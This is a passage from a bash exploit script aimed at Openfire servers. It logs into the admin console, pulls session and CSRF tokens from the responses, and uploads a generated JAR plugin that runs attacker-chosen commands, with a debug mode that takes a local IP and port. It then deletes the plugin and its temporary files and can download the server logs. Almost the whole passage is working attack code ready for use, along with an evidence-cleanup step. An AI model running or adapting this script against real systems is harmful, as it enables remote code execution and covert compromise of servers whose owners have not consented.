fi

mv "$class_name.class" "./classes/$class_name.class"

jar -cvf "$jar_name.jar" classes plugin.xml > /dev/null 2>&1 
if [ -f "$jar_name.jar" ]; then

    echo -e "\e[32m[+]\e[0m Your $jar_name.jar is ready for upload"
    conf_jar[File-Content-b64]=$(cat "$jar_name.jar" | base64 -w0)
    conf_jar[MIME-Type]="application/java-archive"
    conf_jar[File-Name]="$jar_name.jar"
    conf_jar[Plugin-Name]="$jar_name"
    conf_jar[Location]="$working_dir"
    conf_jar[Java-Code]="$java_code"
    conf_jar[Plugin-XML]="$plugin_xml"
    if [ -z "$dont_clean" ]; then 
        rm -fr "$working_dir"
    fi

else
    echo -e "\e[31m[-]\e[0m Failed to make your $jar_name.jar"
    if [ -z "$dont_clean" ]; then 
        rm -fr "$working_dir"
    fi
    exit 1
    
fi

}


function gen_random_num() {

while [[ "$#" -gt 0 ]]; do
  case "$1" in
    -length) length="$2"; shift ;;
    *) echo "Unknown parameter: $1" ;;
  esac
  shift
done

        rand_str=""
        chars=({a..z} {0..9})

        for ((i=0; i<$length; i++)); do
          rand_str+="${chars[RANDOM % ${#chars[@]}]}"
        done

        echo -n "$rand_str"
}

function get_cookie() {

while [[ "$#" -gt 0 ]]; do
  case "$1" in
    -response) local res="$2"; shift ;;
    *) echo "Unknown parameter: $1" ;;
  esac
  shift
done
        
        regex_jsid='Set-Cookie: JSESSIONID=([^;]+)'
        regex_csrf='Set-Cookie: csrf=([^;]+)'
        regex_first_line=$'(HTTP/[^\r]+)'

	
	if [[ $res =~ $regex_first_line ]]; then
  
            first_line=( ${BASH_REMATCH[1]} )
            http_code="${first_line[1]}"
	fi


        if [[ $res =~ $regex_jsid ]]; then
  
	    j_sid="${BASH_REMATCH[1]}"
	fi
       

	if [[ $res =~ $regex_csrf ]]; then

	    csrf="${BASH_REMATCH[1]}"

	else

	    echo -e "\n\e[31m[-]\e[0m No cookies or tokens have been found\n"

	fi



}

function upload_jar() {

	if [ "${custom_jar:-}" == "true" ]; then
		
		jar_path="$custom_jar_path"
		info_lst=( ${jar_path//// } )
		f="${info_lst[-1]}"
		m="application/java-archive"
                
		echo "${info_lst[@]}"
		info_lst=( ${f/./ } )
		p="${info_lst[0]}"
		echo "$p"

	else
		if [ "${cmd_debug:-}" == "true" ]; then
		    build_jar -command -shell "${cmd_lst[0]}" -switch "${cmd_lst[1]}"  -cmd "${cmd_lst[2]}" -debug -ip "$local_ip" -port "$local_port" -dont_clean ${java_version:-} ${print_java_code:-}
		else
		    build_jar -command -shell "${cmd_lst[0]}" -switch "${cmd_lst[1]}" -cmd "${cmd_lst[2]}" -dont_clean ${java_version:-} ${print_java_code:-}
		fi

		f="${conf_jar[File-Name]}"
		m="${conf_jar[MIME-Type]}"
		p="${conf_jar[Plugin-Name]}"
		l="${conf_jar[Location]}"
		jar_path="$l/$f"
        fi


        # getting csrf token for plugin upload 
	res=$(curl "$target/plugin-admin.jsp" -H "Cookie: JSESSIONID=$j_sid" ${proxy:-} ${ssl:-} -i -s)
        get_cookie -response "$res"

        echo -e "\nTrying to upload $f as a plugin..."
	res=$(curl "$target/plugin-admin.jsp?uploadplugin&csrf=$csrf" ${proxy:-} -H "Cookie: JSESSIONID=$j_sid; csrf=$csrf" -F "uploadfile=@$jar_path;type=$m" ${ssl:-} -s -w '%header{Location}')
	status=( ${res/"?"/ } )

	sleep 3

	if [ "${status[1]}" == "uploadsuccess=true" ]; then
	    echo -e "\e[32m[+]\e[0m Plugin upload succeed"
	else
	    echo -e "\e[31m[-]\e[0m Plugin upload failed"
	fi
	    


        # getting csrf token for plugin deletion 
	res=$(curl "$target/plugin-admin.jsp" -H "Cookie: JSESSIONID=$j_sid" ${proxy:-} ${ssl:-} -i -s)
        get_cookie -response "$res"
        
	echo -e "\nPreforming a clean up..."
        echo -e "Trying to delete $p plugin..."
	
	res=$(curl "$target/plugin-admin.jsp?csrf=$csrf&deleteplugin=$p" -H "Cookie: JSESSIONID=$j_sid; csrf=$csrf" ${proxy:-} -w '%header{Location}' ${ssl:-} -s)
	
        status=( ${res/"?"/ } )
	if [ "${status[1]}" == "deletesuccess=true" ]; then
	    echo -e "\e[32m[+]\e[0m Plugin deletion succeed"
	else
	    echo -e "\e[31m[-]\e[0m Plugin deletion failed"
	fi

        if [ -z "${custom_jar:-}" ]; then
	    rm -rf "$l"
	fi

}


function login() {

# getting cookies to preform a login
res=$(curl "$target/login.jsp" ${proxy:-} ${ssl:-} -i -s)
get_cookie -response "$res"


echo -e "\nTrying to log in to openfire as $username..."
res=$(curl "$target/login.jsp" --data "login=true&csrf=$csrf&username=$username" --data-urlencode "password=$password" -H "Cookie: JSESSIONID=$j_sid; csrf=$csrf" ${proxy:-} ${ssl:-} -i -s)

get_cookie -response "$res"

if [ "$http_code" == "302" ];then

    echo -e "\e[32m[+]\e[0m successfully logged as $username\n"

else
    
    echo -e "\e[31m[-]\e[0m Falied to log as $username\n"
    exit 1

fi

}

function get_log() {


echo -e "\nTrying to grab logs..."
sleep 3
curl "$target/log.jsp?log=all&mode=asc&lines=100" -H "Cookie: JSESSIONID=$j_sid" ${proxy:-} ${ssl:-} -s -o /tmp/log.html
if [ -s "/tmp/log.html" ]; then
    echo -e "\e[32m[+]\e[0m your /tmp/log.html file is ready please open the file in a broswer\n"
else
    echo -e "\e[31m[-]\e[0m failed to grab the logs"
fi


}

function logout() {

	
    echo -e "\nLogging out of openfire as $username...\n"
    res=$(curl "$target/index.jsp?logout=true" -H "Cookie: JSESSIONID=$j_sid" ${proxy:-} ${ssl:-} -i -s)

}

login
upload_jar
[ -n "${get_log:-}" ] && get_log
logout
